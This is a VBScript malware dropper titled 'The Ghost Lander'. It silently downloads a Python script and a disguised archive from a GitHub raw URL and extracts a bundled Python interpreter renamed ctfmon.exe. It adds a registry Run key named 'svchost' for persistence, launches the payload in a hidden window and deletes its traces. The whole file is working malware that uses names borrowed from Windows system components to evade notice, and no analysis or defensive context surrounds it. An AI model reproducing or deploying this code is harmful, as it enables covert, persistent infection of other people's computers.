' --- THE GHOST LANDER (V16.0 - VBS BYPASS) ---
On Error Resume Next

Set shell = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set http = CreateObject("MSXML2.XMLHTTP")
Set stream = CreateObject("Adodb.Stream")

ID = "svchost"
Path = shell.ExpandEnvironmentStrings("%USERPROFILE%") & "\Documents\SystemStorage"
If Not fso.FolderExists(Path) Then fso.CreateFolder(Path)

' 1. LANDING PAYLOADS
C_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/WinServices.py"
Z_URL = "https://raw.githubusercontent.com/itzcurled/footbalhunt/main/mui_cache.bin"

' Download Engine
http.Open "GET", C_URL, False
http.Send
If http.Status = 200 Then
    stream.Open
    stream.Type = 1 ' binary
    stream.Write http.ResponseBody
    stream.SaveToFile Path & "\WinServices.py", 2
    stream.Close
End If

' Download Core Zip
http.Open "GET", Z_URL, False
http.Send
If http.Status = 200 Then
    stream.Open
    stream.Type = 1 ' binary
    stream.Write http.ResponseBody
    stream.SaveToFile Path & "\mui_cache.zip", 2
    stream.Close
End If

' 2. EXTRACTION (Using Windows Shell to unzip silently)
Set objShell = CreateObject("Shell.Application")
Set objSource = objShell.NameSpace(Path & "\mui_cache.zip")
Set objDest = objShell.NameSpace(Path)
objDest.CopyHere objSource.Items(), 16 ' 16 = Respond "Yes to All"

' 3. PERSISTENCE (Registry Run Key)
RegKey = "HKCU\Software\Microsoft\Windows\CurrentVersion\Run\" & ID
shell.RegWrite RegKey, """" & Path & "\python\ctfmon.exe"" """ & Path & "\WinServices.py""", "REG_SZ"

' 4. ENGAGE
shell.Run """" & Path & "\python\ctfmon.exe"" """ & Path & "\WinServices.py""", 0, False

' Cleanup
fso.DeleteFile(Path & "\mui_cache.zip")
